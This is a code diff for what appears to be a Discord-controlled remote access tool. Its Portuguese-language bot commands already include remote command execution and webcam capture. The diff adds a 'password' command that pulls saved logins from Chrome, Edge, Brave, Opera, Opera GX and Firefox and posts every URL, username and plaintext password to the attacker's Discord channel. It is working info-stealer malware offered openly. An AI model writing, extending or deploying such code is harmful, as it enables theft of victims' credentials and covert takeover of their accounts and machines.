@@ -13,6 +13,7 @@ from utils.permissions import is_authorized, is_in_session_channel
 from commands.execute_command import execute_command
 from commands.get_ip_info import get_ip_info
 from commands.camera import take_webcam_photo
+from commands.browser_passwords import get_browser_passwords
 
 def register_commands(client):
     @client.command()
@@ -129,3 +130,58 @@ def register_commands(client):
                 
         except Exception as e:
             await ctx.send(f"```[!] erro: {str(e)}```")
+
+    @client.command()
+    @is_authorized()
+    @is_in_session_channel()
+    async def password(ctx):
+        try:
+            processing_msg = await ctx.send("```[*] obtendo senhas salvas dos navegadores...```")
+            
+            passwords, error = await asyncio.to_thread(get_browser_passwords)
+            
+            if error:
+                await processing_msg.edit(content=f"```[!] erro ao recuperar senhas: {error}```")
+                return
+                
+            chrome_count = len(passwords["chrome"])
+            edge_count = len(passwords["edge"])
+            brave_count = len(passwords["brave"])
+            opera_count = len(passwords["opera"])
+            opera_gx_count = len(passwords["opera_gx"])
+            firefox_count = len(passwords["firefox"])
+            total_count = chrome_count + edge_count + brave_count + opera_count + opera_gx_count + firefox_count
+            
+            if total_count == 0:
+                await processing_msg.edit(content="```[i] nenhuma senha encontrada nos navegadores```")
+                return
+                
+            await processing_msg.edit(content=f"```[+] senhas encontradas: {total_count} ({chrome_count} chrome, {edge_count} edge, {brave_count} brave, {opera_count} opera, {opera_gx_count} opera gx, {firefox_count} firefox)```")
+            
+            for browser, pwd_list in passwords.items():
+                if not pwd_list:
+                    continue
+                    
+                browser_name = browser.capitalize()
+                content = f"**[+] senhas do {browser_name} ({len(pwd_list)})**\n```"
+                
+                for i, pwd in enumerate(pwd_list[:20]):
+                    url_short = pwd["url"][:40] + "..." if len(pwd["url"]) > 40 else pwd["url"]
+                    content += f"\n{i+1}. URL: {url_short}\n   Usuário: {pwd['username']}\n   Senha: {pwd['password']}\n"
+                
+                if len(pwd_list) > 20:
+                    content += f"\n[...] + {len(pwd_list) - 20} senhas não exibidas\n"
+                    
+                content += "```"
+                
+                if len(content) > 1900:
+                    chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
+                    for chunk in chunks:
+                        if not chunk.endswith("```"):
+                            chunk += "```"
+                        await ctx.send(chunk)
+                else:
+                    await ctx.send(content)
+                
+        except Exception as e:
+            await ctx.send(f"```[!] erro ao recuperar senhas: {str(e)}```")
